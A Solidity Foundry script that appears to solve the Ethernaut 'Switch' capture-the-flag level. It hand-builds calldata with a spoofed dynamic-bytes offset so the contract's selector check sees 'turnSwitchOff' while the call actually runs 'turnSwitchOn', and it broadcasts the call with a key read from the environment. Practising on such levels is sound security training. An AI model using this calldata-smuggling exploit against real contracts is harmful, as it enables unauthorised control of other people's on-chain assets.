// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console2.sol";

interface ISwitch {
    function switchOn() external view returns (bool);
    function offSelector() external view returns (bytes4);
    function flipSwitch(bytes memory data) external;
}

contract L29_SwitchScript is Script {
    ISwitch _switch = ISwitch(0xdd8c1BF84d8DeA6c78924FCb8F46C433D619472f);

    function run() external {
        uint256 alice_key = vm.envUint("alice_key");

        // ###########################################################
        vm.startBroadcast(alice_key);

        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        uint256 pointer = uint256(0x60);
        uint256 length = uint256(0x4);
        uint256 dead = uint256(0xdead);

        bytes memory data = abi.encodeWithSelector(
            flipSelector,
            pointer,
            dead,
            bytes32(offSelector),
            length,
            bytes32(onSelector)
        );

        console2.log("switch = ", _switch.switchOn());

        (bool success, ) = address(_switch).call(data);
        if (success) {
            console2.log("success");
        }

        console2.log("switch = ", _switch.switchOn());
        

        // ###########################################################
        vm.stopBroadcast();
    }
}
